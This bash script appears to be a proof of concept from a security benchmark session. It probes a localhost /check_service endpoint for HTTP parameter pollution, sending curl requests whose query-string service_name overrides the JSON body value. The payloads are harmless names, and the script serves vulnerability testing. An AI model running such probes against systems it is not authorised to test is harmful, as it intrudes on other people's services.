#!/bin/bash
# POC: Demonstrates HTTP Parameter Pollution (HPP) on /check_service endpoint where query string parameter takes precedence over JSON body, allowing parameter confusion attacks.
# Target: ./repo
# Created: 2025-11-07T19:20:00.045Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# HTTP Parameter Pollution POC for /check_service endpoint
# Demonstrates parameter confusion: query string takes precedence over JSON body

TARGET_URL="http://localhost:8080"
ENDPOINT="/check_service"

echo "========================================="
echo "HTTP Parameter Pollution POC"
echo "Target: ${TARGET_URL}${ENDPOINT}"
echo "========================================="
echo ""

# Test 1: Valid request with JSON body only
echo "[Test 1] Baseline: Valid request with JSON body (service_name=mysql)"
echo "Command: curl -s -X POST '${TARGET_URL}${ENDPOINT}' -H 'Content-Type: application/json' -d '{\"service_name\": \"mysql\"}'"
RESPONSE1=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
echo "Response: $RESPONSE1"
echo ""

# Test 2: HPP Attack - conflicting parameters
echo "[Test 2] HTTP Parameter Pollution: Query string + JSON body conflict"
echo "Query parameter: service_name=test123invalid"
echo "Body parameter: service_name=mysql"
echo "Command: curl -s -X POST '${TARGET_URL}${ENDPOINT}?service_name=test123invalid' -H 'Content-Type: application/json' -d '{\"service_name\": \"mysql\"}'"
RESPONSE2=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=test123invalid" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
echo "Response: $RESPONSE2"
echo ""

# Test 3: Show parameter precedence by checking error response
echo "[Test 3] Confirm query parameter takes precedence (invalid service name via query)"
echo "Query parameter: service_name=nonexistent_service_xyz"
echo "Body parameter: service_name=mysql"
echo "Command: curl -s -X POST '${TARGET_URL}${ENDPOINT}?service_name=nonexistent_service_xyz' -H 'Content-Type: application/json' -d '{\"service_name\": \"mysql\"}'"
RESPONSE3=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=nonexistent_service_xyz" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "mysql"}')
echo "Response: $RESPONSE3"
echo ""

# Test 4: Valid query parameter + valid body (should use query parameter)
echo "[Test 4] Valid query parameter overrides body parameter"
echo "Query parameter: service_name=mysql"
echo "Body parameter: service_name=postgres"
echo "Command: curl -s -X POST '${TARGET_URL}${ENDPOINT}?service_name=mysql' -H 'Content-Type: application/json' -d '{\"service_name\": \"postgres\"}'"
RESPONSE4=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}?service_name=mysql" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "postgres"}')
echo "Response: $RESPONSE4"
echo ""

echo "========================================="
echo "Analysis:"
echo "- If responses differ based on query vs body parameters, HPP vulnerability confirmed"
echo "- If query parameter consistently takes precedence, parameter confusion is confirmed"
echo "========================================="